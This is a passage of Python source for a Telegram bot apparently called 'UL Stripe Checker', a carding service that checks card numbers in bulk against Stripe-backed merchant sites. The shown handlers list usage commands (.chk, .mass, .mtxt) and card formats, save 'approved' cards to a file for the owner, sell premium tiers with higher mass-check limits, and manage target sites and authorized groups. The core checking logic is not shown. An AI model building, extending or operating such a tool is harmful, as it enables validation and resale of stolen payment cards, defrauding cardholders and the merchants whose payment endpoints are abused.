    """Show approved cards statistics"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    try:
        if os.path.exists("approved.txt"):
            with open("approved.txt", "r", encoding="utf-8") as f:
                lines = f.readlines()
                total_cards = len(lines)
                
                # Count approved cards (non-3D)
                approved_count = sum(1 for line in lines if 'Approved ✅' in line)
                three_d_count = sum(1 for line in lines if '3D Required' in line)
                declined_count = total_cards - approved_count - three_d_count
                
                # Get file size
                file_size = os.path.getsize("approved.txt") / 1024  # KB
                
                # Get last modified time
                mod_time = datetime.fromtimestamp(os.path.getmtime("approved.txt"))
                
            msg = f"""<b>📊 APPROVED CARDS STATISTICS</b>

<b>Total Cards:</b> {total_cards}
<b>Approved (Non-3D):</b> {approved_count}
<b>3D Required:</b> {three_d_count}
<b>Declined:</b> {declined_count}
<b>File Size:</b> {file_size:.2f} KB
<b>Last Updated:</b> {mod_time.strftime('%Y-%m-%d %H:%M:%S')}

<b>Commands:</b>
• /getapproved - Download file
• /clearapproved - Clear file (creates backup)
• /stats - Show statistics"""
            
        else:
            msg = "❌ No approved cards file found yet."
        
        safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error getting statistics: {str(e)}", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['gid'])
def get_group_id(message):
    """Get group ID for authorization"""
    if message.chat.type == 'private':
        safe_send_message(message.chat.id, "❌ This command only works in groups!", reply_to_message_id=message.message_id)
        return
    
    group_id = message.chat.id
    group_name = message.chat.title or "Unknown Group"
    
    msg = f"""<b>📋 GROUP INFORMATION</b>

<b>Group Name:</b> {html.escape(group_name)}
<b>Group ID:</b> <code>{group_id}</code>

<b>Status:</b> {"✅ Authorized" if is_group_authorized(group_id) else "❌ Not Authorized"}

<b>To authorize:</b>
Send this ID to owner: <code>{group_id}</code>"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['ag'])
def authorize_group(message):
    """Authorize a group (Owner only)"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /ag <group_id>\n\nExample: /ag -1001234567890", reply_to_message_id=message.message_id)
        return
    
    try:
        group_id = int(parts[1])
        
        with groups_lock:
            if group_id in authorized_groups:
                safe_send_message(message.chat.id, f"⚠️ Group <code>{group_id}</code> is already authorized!", reply_to_message_id=message.message_id)
                return
            
            authorized_groups.append(group_id)
        
        safe_send_message(
            message.chat.id,
            f"""✅ <b>Group Authorized Successfully!</b>

<b>Group ID:</b> <code>{group_id}</code>

The bot can now be used in this group.""",
            reply_to_message_id=message.message_id
        )
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid group ID! Must be a number.", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['bg'])
def ban_group(message):
    """Remove group authorization (Owner only)"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /bg <group_id>\n\nExample: /bg -1001234567890", reply_to_message_id=message.message_id)
        return
    
    try:
        group_id = int(parts[1])
        
        with groups_lock:
            if group_id not in authorized_groups:
                safe_send_message(message.chat.id, f"⚠️ Group <code>{group_id}</code> is not authorized!", reply_to_message_id=message.message_id)
                return
            
            authorized_groups.remove(group_id)
        
        safe_send_message(
            message.chat.id,
            f"""✅ <b>Group Authorization Removed!</b>

<b>Group ID:</b> <code>{group_id}</code>

The bot can no longer be used in this group.""",
            reply_to_message_id=message.message_id
        )
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid group ID! Must be a number.", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['groups'])
def list_groups(message):
    """List all authorized groups (Owner only)"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    with groups_lock:
        if not authorized_groups:
            safe_send_message(message.chat.id, "❌ No groups authorized yet.", reply_to_message_id=message.message_id)
            return
        
        # Count groups
        groups_count = len(authorized_groups)
        
        # Create groups list
        groups_list = ""
        for i, group_id in enumerate(authorized_groups, 1):
            groups_list += f"{i}. <code>{group_id}</code>\n"
        
        msg = f"""<b>📋 AUTHORIZED GROUPS</b>

<b>Total Groups:</b> {groups_count}

<b>Group IDs:</b>
{groups_list}

<b>Commands:</b>
• /ag <group_id> - Authorize group
• /bg <group_id> - Ban group
• /gid - Get group ID (use in group)"""
        
        safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['setlimit'])
def setlimit_command(message):
    """Admin: Set limits"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    parts = message.text.split()
    if len(parts) < 4:
        msg = """❌ Usage: /setlimit <user_type> <limit_type> <value>

<b>User Types:</b>
• free - Free users
• premium - Premium users

<b>Limit Types:</b>
• single - Single check limit
• mass - Mass check limit
• mtxt - File check limit
• daily - Daily limit
• cooldown - Cooldown in seconds

<b>Examples:</b>
• /setlimit free mass 50
• /setlimit premium mtxt 1000
• /setlimit free daily 200
• /setlimit premium cooldown 2
• /setlimit free mass inf (for unlimited)"""
        safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
        return
    
    user_type = parts[1].lower()
    limit_type = parts[2].lower()
    
    if user_type not in ['free', 'premium']:
        safe_send_message(message.chat.id, "❌ Invalid user type! Use 'free' or 'premium'", reply_to_message_id=message.message_id)
        return
    
    if limit_type not in ['single', 'mass', 'mtxt', 'daily', 'cooldown']:
        safe_send_message(message.chat.id, "❌ Invalid limit type!", reply_to_message_id=message.message_id)
        return
    
    try:
        if parts[3].lower() in ['inf', 'infinity', '∞']:
            value = float('inf')
        else:
            value = int(parts[3])
            if value < 0:
                safe_send_message(message.chat.id, "❌ Value must be positive!", reply_to_message_id=message.message_id)
                return
    except:
        safe_send_message(message.chat.id, "❌ Invalid value! Must be a number.", reply_to_message_id=message.message_id)
        return
    
    # Update limit
    user_limits[user_type][limit_type] = value
    
    display_value = '∞' if value == float('inf') else str(value)
    safe_send_message(
        message.chat.id,
        f"""✅ <b>Limit Updated!</b>

<b>User Type:</b> {user_type.upper()}
<b>Limit Type:</b> {limit_type.upper()}
<b>New Value:</b> {display_value}

<b>Updated limits take effect immediately for all users.</b>""",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=['status'])
def status_command(message):
    """Admin: Bot status"""
    if message.from_user.id not in OWNER_IDS:
        safe_send_message(message.chat.id, "❌ Only owner can use this command!", reply_to_message_id=message.message_id)
        return
    
    with active_checks_lock:
        active_list = []
        for user_id, info in active_checks.items():
            elapsed = time.time() - info['start_time']
            user_id = info.get('user_id', 'Unknown')
            active_list.append(f"• User {user_id}: {info['type']}, {info['total']} cards, {elapsed:.0f}s")
    
    active_text = "\n".join(active_list) if active_list else "No active checks"
    
    with groups_lock:
        groups_count = len(authorized_groups)
    
    with sites_lock:
        sites_count = len(stripe_sites)
        sites_list = ", ".join(stripe_sites) if stripe_sites else "No sites"
    
    # Check approved file
    approved_count = 0
    if os.path.exists("approved.txt"):
        with open("approved.txt", "r", encoding="utf-8") as f:
            approved_count = len(f.readlines())
    
    # Count premium users
    premium_count = 0
    with data_lock:
        for user_data in users_data.values():
            if 'premium_until' in user_data:
                try:
                    premium_until = datetime.fromisoformat(user_data['premium_until'])
                    if datetime.now() < premium_until:
                        premium_count += 1
                except:
                    continue
    
    msg = f"""<b>📊 BOT STATUS</b>

<b>👥 Total Users:</b> {len(status_data['users_checked'])}
<b>🔍 Total Checks:</b> {status_data['total_checks']}
<b>✅ Total Approved:</b> {status_data['total_approved']}
<b>💎 Premium Users:</b> {premium_count}
<b>📁 Approved Cards:</b> {approved_count}
<b>🏢 Authorized Groups:</b> {groups_count}
<b>🌐 Active Sites:</b> {sites_count}

<b>⚡ Active Checks ({len(active_checks)}):</b>
{active_text}

<b>🔧 Workers:</b> {num_workers}
<b>🕐 Uptime:</b> Always Online

<b>Sites:</b> {sites_list}

<b>🤖 Bot By: @OG_UNDEFINED</b>"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['info'])
def info_command(message):
    """User information"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    user_status = get_user_status(message.from_user.id)
    limits = get_user_limits(message.from_user.id)
    current_usage = get_user_today_usage(message.from_user.id)
    
    if user_status == 'owner':
        status_emoji = '👑'
        status_text = 'OWNER'
    elif user_status == 'premium':
        status_emoji = '💎'
        status_text = 'PREMIUM'
        # Get premium expiration
        with data_lock:
            user_data = users_data.get(str(message.from_user.id), {})
            if 'premium_until' in user_data:
                try:
                    premium_until = datetime.fromisoformat(user_data['premium_until'])
                    days_left = (premium_until - datetime.now()).days
                    status_text += f" ({days_left} days left)"
                except:
                    pass
    else:
        status_emoji = '⚡'
        status_text = 'FREE'
    
    # Check if in authorized group
    group_status = ""
    if message.chat.type != 'private':
        group_status = f"\n<b>🏢 Group Status:</b> {'✅ Authorized' if is_group_authorized(message.chat.id) else '❌ Not Authorized'}"
    
    with sites_lock:
        sites_count = len(stripe_sites)
    
    msg = f"""<b>📱 USER INFORMATION</b>

<b>{status_emoji} Status:</b> {status_text}
<b>👤 Name:</b> {message.from_user.first_name}
<b>🆔 User ID:</b> <code>{message.from_user.id}</code>
<b>📊 Today's Usage:</b> {current_usage}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}
<b>🌐 Active Sites:</b> {sites_count}{group_status}

<b>🎯 Limits:</b>
• Single Check: {limits['single'] if limits['single'] != float('inf') else '∞'} card
• Mass Check: {limits['mass'] if limits['mass'] != float('inf') else '∞'} cards
• File Check: {limits['mtxt'] if limits['mtxt'] != float('inf') else '∞'} cards
• Cooldown: {limits['cooldown']} seconds

<b>⚡ Commands:</b>
• .chk [card] - Single check
• .mass - Mass check (text)
• .mtxt - Mass check (file)
• /limits - View all limits
• /ping - Check bot status
• /stopcheck - Stop current check

<b>🤖 Bot By: @OG_UNDEFINED</b>"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['limits'])
def limits_command(message):
    """Show all limits"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    msg = f"""<b>📊 USER LIMITS CONFIGURATION</b>

<b>🎯 FREE USERS:</b>
• Single Check: 1 card
• Mass Check (.mass): {user_limits['free']['mass']} cards
• File Check (.mtxt): {user_limits['free']['mtxt']} cards
• Daily Limit: {user_limits['free']['daily']} cards
• Cooldown: {user_limits['free']['cooldown']} seconds

<b>💎 PREMIUM USERS:</b>
• Single Check: 1 card
• Mass Check (.mass): {user_limits['premium']['mass'] if user_limits['premium']['mass'] != float('inf') else '∞'} cards
• File Check (.mtxt): {user_limits['premium']['mtxt'] if user_limits['premium']['mtxt'] != float('inf') else '∞'} cards
• Daily Limit: {user_limits['premium']['daily'] if user_limits['premium']['daily'] != float('inf') else '∞'} cards
• Cooldown: {user_limits['premium']['cooldown']} seconds

<b>👑 OWNER:</b>
• All limits: Unlimited
• Cooldown: 0 seconds

<b>📝 Notes:</b>
• Limits reset daily at midnight
• Cooldown applies to .chk commands only
• .mass and .mtxt process immediately
• Multiple users can check simultaneously
• Limits apply in both groups and private chats

<b>⚡ Your Status:</b> {get_user_status(message.from_user.id).upper()}"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['ping'])
def ping_command(message):
    """Check bot status"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    with active_checks_lock:
        active_count = len(active_checks)
    
    with sites_lock:
        sites_count = len(stripe_sites)
    
    # Check group authorization status
    group_status = ""
    if message.chat.type != 'private':
        group_status = f"\n<b>🏢 Group Status:</b> {'✅ Authorized' if is_group_authorized(message.chat.id) else '❌ Not Authorized'}"
    
    msg = f"""<b>🏓 PONG!</b>

<b>⚡ Bot Status:</b> ✅ ONLINE
<b>👥 Active Checks:</b> {active_count}
<b>🌐 Active Sites:</b> {sites_count}
<b>👤 Your ID:</b> {message.from_user.id}{group_status}

<b>🤖 Bot By: @OG_UNDEFINED</b>"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['help'])
def help_command(message):
    """Help message"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    user_status = get_user_status(message.from_user.id)
    
    msg = """<b>🤖 UL STRIPE CHECKER - HELP</b>

<b>⚡ Quick Commands:</b>
• <code>.chk 4111111111111111|12|2026|123</code>
• <code>.chk</code> (reply to card message)
• <code>.chk visa</code> (test visa card)
• <code>.mass</code> (reply to text with cards)
• <code>.mtxt</code> (reply to .txt file)

<b>📌 All Commands:</b>
• .chk [card] - Check single card
• .mass - Mass check from text
• .mtxt - Mass check from file (exact format)
• /info - Your account info
• /limits - View all limits
• /ping - Check bot status
• /stopcheck - Stop current check
• /help - This help message"""
    
    # Add premium commands for premium users
    if user_status in ['premium', 'owner']:
        msg += """

<b>💎 Premium Commands:</b>
• All commands work in private chat
• Higher limits for mass checks
• Reduced cooldown"""
    
    # Add admin commands for owner
    if user_status == 'owner':
        msg += """

<b>👑 Admin Commands:</b>
• /addpremium - Give premium to user
• /removepremium - Remove premium
• /premiuminfo - Check user premium status
• /premiumusers - List all premium users
• /setlimit - Set user limits
• /status - Bot statistics
• /addsite - Add stripe site
• /removesite - Remove site
• /sites - List all sites
• /testsite - Test site
• /ag - Authorize group
• /bg - Ban group
• /groups - List authorized groups
• /gid - Get group ID
• /getapproved - Get approved cards file
• /clearapproved - Clear approved cards
• /stats - Approved cards statistics"""
    else:
        msg += """

<b>👑 Admin Commands:</b>
• Contact owner for premium access"""
    
    msg += """

<b>📝 Card Formats:</b>
• 4111111111111111|12|2026|123
• 4111111111111111 12 2026 123
• 4111111111111111:12:2026:123

<b>💳 CC Filters (.chk command):</b>
• .chk visa - Test Visa card
• .chk mastercard - Test Mastercard
• .chk amex - Test American Express
• .chk discover - Test Discover

<b>📁 File Format (.mtxt):</b>
• One card per line
• Supports multiple formats
• Max 10MB file size

<b>⚠️ Important:</b>
• Bot supports 600+ users simultaneously
• Checks process immediately (no queue)
• Daily limits reset at midnight
• Stop button available during checks
• Bot works in authorized groups only

<b>🤖 Bot By: @OG_UNDEFINED</b>
<b>📞 Support: Contact owner</b>"""
    
    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)

# ==================== DATA PERSISTENCE ====================

def save_users_data():
    """Save users data to file"""
    while True:
        time.sleep(300)  # Save every 5 minutes
        
        with data_lock:
            try:
                with open('users_data.json', 'w', encoding='utf-8') as f:
                    json.dump(users_data, f, ensure_ascii=False, indent=2)
                print("Users data saved successfully")
            except Exception as e:
                print(f"Error saving users data: {e}")

def load_users_data():
    """Load users data from file"""
    global users_data
    try:
        if os.path.exists('users_data.json'):
            with open('users_data.json', 'r', encoding='utf-8') as f:
                users_data = json.load(f)
            print("Users data loaded successfully")
    except Exception as e:
        print(f"Error loading users data: {e}")
        users_data = {}

# Start data persistence thread
persistence_thread = threading.Thread(target=save_users_data, daemon=True)
persistence_thread.start()

# Load data on startup
load_users_data()

print(f"✅ BOT STARTING WITH {num_workers} WORKERS...")
print(f"👑 Owner IDs: {', '.join(map(str, OWNER_IDS))}")
print(f"🏢 Group Authorization: Enabled")
print(f"🌐 Default Site: rosetone.co.uk")
print(f"🤖 Bot optimized for 600+ users")
print(f"⚡ Commands: .chk, .mass, .mtxt")
print(f"💳 CC Filters: visa, mastercard, amex, discover")
print(f"📊 Status Display: Approved ✅ / Declined ❌ / 3D Required ⚠️")
print(f"💬 Approved cards now reply to command message")
print(f"🚫 3D cards are NOT sent to chat (only saved to file)")
print(f"🔍 Mass check now extracts ALL cards properly")
print(f"🔒 Free users restricted to group only")
print(f"💎 Premium system: Enabled with data persistence")
print(f"⚡ PARALLEL CHECKING: 3-CARD BATCHES ONLY (3-3 batch)")
print(f"🔒 USER ISOLATION FIXED: Each user's session is now properly isolated")
print(f"🛑 STOP BUTTON FIXED: Now correctly identifies user")
print(f"🔧 MULTI-USER FIXED: Multiple users can check simultaneously without conflicts")
print(f"🔥 ALL YOUR ORIGINAL FEATURES PRESERVED 100%")

bot.infinity_polling(timeout=30, long_polling_timeout=30)
